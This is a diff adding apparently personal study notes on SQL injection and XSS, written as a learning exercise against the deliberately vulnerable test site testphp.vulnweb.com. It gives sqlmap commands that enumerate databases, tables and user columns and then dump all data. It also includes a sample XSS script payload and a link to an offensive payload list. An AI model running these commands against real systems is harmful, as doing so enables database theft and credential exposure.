@@ -1,0 +1,23 @@
+# SQL INJECTIONS
+- testphp.vulnweb.com - Our test site
+- In Kali Linux itself we have a tool for sql injections called as sqlmap
+- ```sudo apt install sqlmap```
+-  man db - manual database
+- verbosity -v0----v6.
+- OWASP ZAP- An automation tool to find the known vulnerabilities 
+- -   **Cross-Site Scripting (XSS):** Attackers inject malicious scripts into websites to steal data or hijack sessions.
+- eg-<script>alert('Sumit')</script>
+-   **HTML Injections:** Inserting malicious HTML code to manipulate or harm users accessing web pages.
+- Repository for payloads- [InfoSecWarrior/Offensive-Payloads: List of payloads and wordlists that are specifically crafted to identify and exploit vulnerabilities in target web applications. (github.com)](https://github.com/InfoSecWarrior/Offensive-Payloads)
+- We can add them to BurpSuite and bruteforce 
+- We may use different options while using sqlmap
+- For the time being we go with ```sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=2 -dbs```
+- (getting info about database)
+- union query - a combination of data base
+- We get to know about the two databases- acuart and information_schema
+- ```sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=2 -D acuart --tables```
+- from among the table we need to guess which data can be most confidential data(users)
+- ```sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=2 -D acuart -T users --columns```
+- Now the hacker will want to download the data by -
+- ```sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=2 -D acuart --tables --dump-all```
+- Keep a note of the location where the file is saved 
